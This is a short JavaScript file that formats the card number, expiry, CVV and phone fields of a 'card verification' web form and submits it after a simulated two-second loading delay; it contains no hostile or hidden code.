document.addEventListener('DOMContentLoaded', () => {
    const cardNumberInput = document.getElementById('card-number');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const phoneNumberInput = document.getElementById('phone-number');
    const form = document.getElementById('card-verification-form');
    const loadingOverlay = document.getElementById('loading-overlay');

    // Format card number input with spaces every 4 digits
    cardNumberInput.addEventListener('input', () => {
        let value = cardNumberInput.value.replace(/\D/g, '');
        value = value.replace(/(.{4})/g, '$1 ').trim();
        cardNumberInput.value = value;
    });

    // Format expiry date input with / after MM
    expiryDateInput.addEventListener('input', () => {
        let value = expiryDateInput.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        expiryDateInput.value = value;
    });

    // Format phone number input to allow only digits
    phoneNumberInput.addEventListener('input', () => {
        phoneNumberInput.value = phoneNumberInput.value.replace(/\D/g, '');
    });

    // Format CVV input to allow only 3 digits
    cvvInput.addEventListener('input', () => {
        cvvInput.value = cvvInput.value.replace(/\D/g, '').slice(0, 3);
    });

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        loadingOverlay.classList.add('active');
        // Simulate server loading with a timeout
        setTimeout(() => {
            form.submit();
        }, 2000); // Adjust the timeout as needed
    });
});
